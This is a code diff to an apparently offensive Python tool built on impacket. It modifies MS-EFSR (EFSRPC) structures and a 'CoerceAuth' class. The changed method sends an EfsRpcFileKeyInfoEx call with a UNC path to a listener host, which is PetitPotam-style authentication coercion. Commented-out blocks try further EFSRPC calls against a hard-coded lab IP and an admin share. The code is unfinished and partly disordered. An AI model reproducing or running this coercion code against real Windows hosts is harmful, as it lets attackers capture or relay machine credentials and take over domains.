@@ -12,7 +12,7 @@ import argparse
 from impacket import system_errors
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
-from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, LPBYTE
+from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, LPBYTE, NDRPOINTERNULL
 from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.uuid import uuidtup_to_bin
 
@@ -113,9 +113,9 @@ class EFS_RPC_BLOB(NDRSTRUCT):
         ('cbData', PCHAR),
     )
 class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
-    align = 1
     structure = (
-        ('Data', ':'),
+        ('nUsers', DWORD),
+        ('Users', ENCRYPTION_CERTIFICATE_HASH),
     )
 
 class ENCRYPTION_PROTECTOR_LIST(NDRSTRUCT):
@@ -231,7 +231,6 @@ class EfsRpcAddUsersToFile(NDRCALL):
     structure = (
         ('FileName', WSTR),
         ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST)
-        
     )
 class EfsRpcAddUsersToFileResponse(NDRCALL):
     structure = (
@@ -241,7 +240,7 @@ class EfsRpcFileKeyInfo(NDRCALL):
     opnum = 12
     structure = (
         ('FileName', WSTR),
-        ('infoClass', DWORD),
+        ('InfoClass', DWORD),
     )
 class EfsRpcFileKeyInfoResponse(NDRCALL):
     structure = (
@@ -257,30 +256,29 @@ class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
         ('RelativeSD', EFS_RPC_BLOB),
         ('bInheritHandle', BOOL),
     ) 
-    
 class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
     structure = (
         ('ErrorCode', ULONG),
     )
+
 class EfsRpcAddUsersToFileEx(NDRCALL):
     opnum = 15
     structure = (
         ('dwFlags', DWORD),
-        ('Reserved', EFS_RPC_BLOB),
+        ('Reserved', NDRPOINTERNULL),
         ('FileName', WSTR),
-        ('dwAttributes', DWORD),
         ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST),
     ) 
-    
 class EfsRpcAddUsersToFileExResponse(NDRCALL):
     structure = (
         ('ErrorCode', ULONG),
     )
+    
 class EfsRpcFileKeyInfoEx(NDRCALL):
     opnum = 16
     structure = (
         ('dwFileKeyInfoFlags', DWORD),
-        ('Reserved', EFS_RPC_BLOB),
+        ('Reserved', NDRPOINTERNULL),
         ('FileName', WSTR),
         ('InfoClass', DWORD),
     )
@@ -412,15 +410,41 @@ class CoerceAuth():
         return dce
         
     def EfsRpcOpenFileRaw(self, dce, listener):
-        print("[-] Sending EfsRpcOpenFileRaw!")
+        print(listener)
+        BASIC_KEY_INFO = 0x00000001
+        CHECK_COMPATIBILITY_INFO = 0x00000002
+        UPDATE_KEY_USED = 0x00000100
+        CHECK_DECRYPTION_STATUS = 0x00000200
+        CHECK_ENCRYPTION_STATUS = 0x00000400
+        request = EfsRpcFileKeyInfoEx()
+        request['dwFileKeyInfoFlags'] = '0'
+        request['InfoClass'] = 0
+        request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
+        resp = dce.request(request)
+        resp.dump()
         try:
-            
-            request = EfsRpcGetEncryptedFileMetadata()
-            request['FileName'] = '\\\\192.168.85.128\\C$\\Users\\Public\\test.txt\x00'
+            '''
+            BASIC_KEY_INFO = 0x00000001
+            CHECK_COMPATIBILITY_INFO = 0x00000002
+            UPDATE_KEY_USED = 0x00000100
+            CHECK_DECRYPTION_STATUS = 0x00000200
+            CHECK_ENCRYPTION_STATUS = 0x00000400
+            request = EfsRpcFileKeyInfoEx()
+            request['dwFileKeyInfoFlags'] = '0'
+            request['InfoClass'] = 0
+            request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
             resp = dce.request(request)
             resp.dump()
 
-            '''
+            EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE = 0x00000002
+            EFSRPC_ADDUSERFLAG_REPLACE_DDF = 0x00000004
+            request = EfsRpcAddUsersToFileEx()
+            request['dwFlags'] = EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE
+            request['FileName'] = '\\\\192.168.85.128\\C$\\Users\\Public\\test.txt\x00'
+            resp = dce.request(request)
+            print(resp)
+            resp.dump()
+            
             request = EfsRpcDecryptFileSrv()
             request['FileName'] = '\\\\192.168.85.128\\C$\\Users\\Public\\test.txt\x00'
             resp = dce.request(request)
